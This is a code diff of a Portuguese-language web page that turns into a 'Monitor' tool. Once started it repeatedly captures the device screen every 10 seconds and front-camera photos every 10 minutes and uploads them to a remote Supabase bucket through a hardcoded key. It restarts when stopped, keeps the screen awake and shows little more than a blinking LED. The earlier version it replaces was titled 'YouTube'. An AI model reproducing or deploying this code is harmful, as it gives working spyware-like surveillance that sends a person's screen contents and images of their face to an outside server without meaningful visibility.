@@ -2,105 +2,286 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
     <meta name="theme-color" content="#000000">
-    <title>YouTube</title>
+    <title>Monitor MEUCEL1</title>
+    <link rel="manifest" href="data:application/json,{'name':'Monitor%20MEUCEL1','short_name':'Monitor','start_url':'.','display':'standalone','background_color':'%23000000','theme_color':'%23000000'}">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #000; height: 100vh; width: 100vw; overflow: hidden; font-family: Arial, sans-serif; }
-        #bgScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(135deg, #0a0a0f, #1a1a2e, #0a0a0f); z-index: 1; display: flex; justify-content: center; align-items: center; }
-        #bgText { color: rgba(255,255,255,0.03); font-size: 60px; font-weight: 900; letter-spacing: 15px; }
-        #statusOverlay { position: fixed; top: 15px; right: 15px; z-index: 10; display: flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.6); padding: 6px 12px; border-radius: 20px; }
-        #statusDot { width: 8px; height: 8px; border-radius: 50%; background: #00ff88; box-shadow: 0 0 10px #00ff88; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-        #statusText { color: rgba(255,255,255,0.7); font-size: 10px; }
-        canvas { display: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            width: 100vw;
+            height: 100vh;
+            height: 100dvh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            touch-action: manipulation;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+        
+        .led {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #00ff00;
+            box-shadow: 0 0 15px #00ff00, 0 0 30px #00ff00, 0 0 45px #00ff00;
+            animation: piscar 2s infinite;
+        }
+        
+        @keyframes piscar {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+        
+        .status {
+            position: fixed;
+            bottom: 20px;
+            color: #003300;
+            font-family: monospace;
+            font-size: 10px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <div id="bgScreen"><div id="bgText">●</div></div>
-    <div id="statusOverlay"><div id="statusDot"></div><div id="statusText">ATIVO</div></div>
-    <canvas id="captureCanvas"></canvas>
+    <div class="led" id="led"></div>
+    <div class="status" id="status">iniciando...</div>
 
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
-
     <script>
+        // ============ CONFIGURAÇÃO SUPABASE ============
         const SUPABASE_URL = 'https://vlkobipdenduyismnkpm.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_qWeCNdiMyftZ6ZMYDF9u_A_bOplqpiA';
+        const CODIGO_SESSAO = 'MEUCEL1';
+        
         const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
         
-        const SESSION_CODE = 'MEUCEL1';
-        const INTERVAL = 30;
-        let count = 0;
+        // ============ ELEMENTOS ============
+        const led = document.getElementById('led');
+        const statusEl = document.getElementById('status');
         
-        supabase.from('sessions').upsert({
-            session_code: SESSION_CODE, online: true, total_captures: 0,
-            started_at: new Date().toLocaleString('pt-BR')
-        }).then(() => console.log('[OK] Sessão ativa'));
+        // ============ VARIÁVEIS ============
+        let screenStream = null;
+        let screenVideo = null;
+        let screenCanvas = null;
+        let cameraStream = null;
+        let cameraVideo = null;
+        let cameraCanvas = null;
+        let printInterval = null;
+        let cameraInterval = null;
         
-        window.addEventListener('load', () => {
-            setTimeout(() => {
-                captureAndUpload();
-                setInterval(captureAndUpload, INTERVAL * 1000);
-            }, 3000);
-        });
+        // ============ FUNÇÕES ============
+        function updateStatus(msg) {
+            statusEl.textContent = msg;
+            console.log(msg);
+        }
         
-        async function captureAndUpload() {
+        // Upload para o Supabase Storage
+        async function uploadToSupabase(blob, filename, tipo) {
             try {
-                count++;
-                const ts = Date.now();
-                const now = new Date();
-                console.log('[CAPTURA] #' + count);
+                const filePath = `${CODIGO_SESSAO}/${tipo}/${filename}`;
                 
-                const canvas = await html2canvas(document.body, {
-                    useCORS: true, allowTaint: true, scale: 0.6, logging: false, backgroundColor: '#000'
-                });
-                
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.65));
-                if (!blob || blob.size < 500) throw new Error('Blob vazio');
-                
-                const filename = SESSION_CODE + '/' + ts + '.jpg';
-                console.log('[UPLOAD] ' + filename + ' (' + Math.round(blob.size/1024) + 'KB)');
-                
-                const { error: uploadError } = await supabase.storage
+                const { data, error } = await supabase.storage
                     .from('captures')
-                    .upload(filename, blob, {
+                    .upload(filePath, blob, {
                         contentType: 'image/jpeg',
-                        cacheControl: '3600',
-                        upsert: true
+                        upsert: false
                     });
                 
-                if (uploadError) {
-                    console.error('[UPLOAD ERROR]', uploadError.message);
-                    throw uploadError;
-                }
+                if (error) throw error;
                 
-                console.log('[UPLOAD OK]');
+                // Registrar na tabela captures
+                const publicUrl = `${SUPABASE_URL}/storage/v1/object/public/captures/${filePath}`;
                 
-                const { data: { publicUrl } } = supabase.storage.from('captures').getPublicUrl(filename);
+                const { error: dbError } = await supabase
+                    .from('captures')
+                    .insert({
+                        codigo_sessao: CODIGO_SESSAO,
+                        tipo: tipo,
+                        url: publicUrl,
+                        filename: filename,
+                        created_at: new Date().toISOString()
+                    });
                 
-                const { error: dbError } = await supabase.from('captures').insert({
-                    id: ts, session_code: SESSION_CODE, filename: filename, url: publicUrl,
-                    time: now.toLocaleTimeString('pt-BR'), date: now.toLocaleString('pt-BR'),
-                    size_kb: Math.round(blob.size / 1024), number: count, storage_path: filename
-                });
+                if (dbError) throw dbError;
                 
-                if (dbError) console.error('[DB ERROR]', dbError.message);
-                else console.log('[DB OK]');
-                
-                await supabase.from('sessions').update({
-                    last_capture: now.toLocaleTimeString('pt-BR'), total_captures: count
-                }).eq('session_code', SESSION_CODE);
-                
-            } catch(e) {
-                console.error('[ERRO]', e.message);
+                updateStatus(`${tipo} enviado: ${filename}`);
+                return true;
+            } catch (error) {
+                updateStatus(`Erro upload: ${error.message}`);
+                return false;
             }
         }
         
-        if ('wakeLock' in navigator) navigator.wakeLock.request('screen').catch(() => {});
+        // Capturar print da tela
+        async function captureScreen() {
+            if (!screenCanvas || !screenVideo) return;
+            
+            const context = screenCanvas.getContext('2d');
+            context.drawImage(screenVideo, 0, 0, screenCanvas.width, screenCanvas.height);
+            
+            screenCanvas.toBlob(async (blob) => {
+                if (blob) {
+                    const timestamp = Date.now();
+                    const filename = `print_${timestamp}.jpg`;
+                    await uploadToSupabase(blob, filename, 'print');
+                }
+            }, 'image/jpeg', 0.8);
+        }
+        
+        // Capturar foto da câmera frontal
+        async function captureCamera() {
+            if (!cameraCanvas || !cameraVideo) return;
+            
+            const context = cameraCanvas.getContext('2d');
+            context.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
+            
+            cameraCanvas.toBlob(async (blob) => {
+                if (blob) {
+                    const timestamp = Date.now();
+                    const filename = `selfie_${timestamp}.jpg`;
+                    await uploadToSupabase(blob, filename, 'selfie');
+                }
+            }, 'image/jpeg', 0.8);
+        }
+        
+        // Iniciar captura de tela
+        async function startScreenCapture() {
+            try {
+                screenStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: {
+                        mediaSource: 'screen',
+                        width: { ideal: 720 },
+                        height: { ideal: 1280 }
+                    },
+                    audio: false
+                });
+                
+                screenVideo = document.createElement('video');
+                screenVideo.srcObject = screenStream;
+                screenVideo.play();
+                
+                screenVideo.onloadedmetadata = () => {
+                    screenCanvas = document.createElement('canvas');
+                    screenCanvas.width = screenVideo.videoWidth;
+                    screenCanvas.height = screenVideo.videoHeight;
+                    
+                    updateStatus('Captura de tela ativa');
+                    
+                    // Primeira captura após 3 segundos
+                    setTimeout(captureScreen, 3000);
+                    
+                    // Capturas a cada 10 segundos
+                    printInterval = setInterval(captureScreen, 10000);
+                };
+                
+                screenStream.getVideoTracks()[0].onended = () => {
+                    updateStatus('Captura de tela encerrada! Reiniciando...');
+                    stopAll();
+                    setTimeout(startAll, 5000);
+                };
+            } catch (error) {
+                updateStatus(`Erro tela: ${error.message}`);
+                // Tentar novamente em 30 segundos
+                setTimeout(startScreenCapture, 30000);
+            }
+        }
+        
+        // Iniciar câmera frontal
+        async function startCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 480 },
+                        height: { ideal: 640 }
+                    },
+                    audio: false
+                });
+                
+                cameraVideo = document.createElement('video');
+                cameraVideo.srcObject = cameraStream;
+                cameraVideo.play();
+                
+                cameraVideo.onloadedmetadata = () => {
+                    cameraCanvas = document.createElement('canvas');
+                    cameraCanvas.width = cameraVideo.videoWidth;
+                    cameraCanvas.height = cameraVideo.videoHeight;
+                    
+                    updateStatus('Câmera frontal ativa');
+                    
+                    // Primeira foto após 5 segundos
+                    setTimeout(captureCamera, 5000);
+                    
+                    // Fotos a cada 10 minutos (600000 ms)
+                    cameraInterval = setInterval(captureCamera, 600000);
+                };
+            } catch (error) {
+                updateStatus(`Erro câmera: ${error.message}`);
+                // Tentar novamente em 60 segundos
+                setTimeout(startCamera, 60000);
+            }
+        }
+        
+        function stopAll() {
+            if (printInterval) clearInterval(printInterval);
+            if (cameraInterval) clearInterval(cameraInterval);
+            
+            if (screenStream) {
+                screenStream.getTracks().forEach(track => track.stop());
+            }
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+        }
+        
+        async function startAll() {
+            updateStatus('Iniciando monitoramento...');
+            await startScreenCapture();
+            await startCamera();
+            updateStatus('Monitoramento ativo');
+        }
+        
+        // Iniciar automaticamente
+        startAll();
+        
+        // Manter tela ativa (prevenir sleep)
+        if ('wakeLock' in navigator) {
+            try {
+                navigator.wakeLock.request('screen');
+            } catch (e) {
+                console.log('Wake Lock não disponível');
+            }
+        }
+        
+        // Piscar LED verde quando houver captura
+        function piscarLED() {
+            led.style.animation = 'none';
+            led.offsetHeight; // Trigger reflow
+            led.style.animation = 'piscar 0.3s 2';
+            setTimeout(() => {
+                led.style.animation = 'piscar 2s infinite';
+            }, 600);
+        }
+        
+        // Monitorar uploads para piscar LED
+        const originalUpload = uploadToSupabase;
+        uploadToSupabase = async function(blob, filename, tipo) {
+            const result = await originalUpload(blob, filename, tipo);
+            if (result) piscarLED();
+            return result;
+        };
     </script>
 </body>
 </html>
